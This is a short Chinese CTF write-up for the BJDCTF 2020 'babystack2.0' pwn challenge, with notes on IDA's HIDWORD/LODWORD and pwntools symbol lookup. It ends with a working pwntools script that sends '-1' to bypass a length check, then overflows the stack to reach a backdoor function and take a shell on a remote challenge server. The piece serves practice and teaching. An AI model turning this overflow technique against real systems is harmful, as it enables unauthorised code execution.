---
title: "[BJDCTF 2020]babystack2.0"
date: "2023-10-22 18:11:21 +0800"
categories:
  - "二进制安全"
tags:
  - "编程语言"
  - "网络安全"
  - "安全"
  - "系统安全"
  - "学习"
  - "Pwn"
excerpt: "没有 file.plt[“backdoor”]，plt 只针对外部函数存在，所以只能用 file.symbol[“backdoor”]。HIDWORD 的作用是取一个 8 字节变量在内存中位于高位的四个字节（即一个 32 位的值），也就是两个字的数据。LODWORD 的作用是取一个 8 字节变量在内存中位于低位的四个字节（即一个 32 位的值），也就是两个字的数据。使用 file.plt[“system”] 不行，因为像这样直接覆盖返回地址没有提供参数。IDA 的栈并不完全准确——连保存的 ebp 都没有显示——所以 IDA 只能作为参考。"
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/133974940"
csdn_article_id: "133974940"
migrated: true
---

{% raw %}
HIDWORD 的作用是取一个 8 字节变量在内存中位于高位的四个字节（即一个 32 位的值），也就是两个字的数据
LODWORD 的作用是取一个 8 字节变量在内存中位于低位的四个字节（即一个 32 位的值），也就是两个字的数据

IDA 的栈并不完全准确，连保存的 ebp 都没有显示，所以 IDA 只能作为参考
没有 file.plt["backdoor"]，plt 只针对外部函数存在，所以只能用 file.symbol["backdoor"]
使用 file.plt["system"] 不行，因为像这样直接覆盖返回地址没有提供参数

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
file=remote("node4.anna.nssctf.cn","28129")
elf=ELF("/home/llk/下载/pwn")
file.sendlineafter("name:","-1")
system_addr=elf.sym["backdoor"]
payload=b'a'*0x18+p64(system_addr)
file.sendlineafter("name?\n",payload)
file.interactive()
```
{% endraw %}
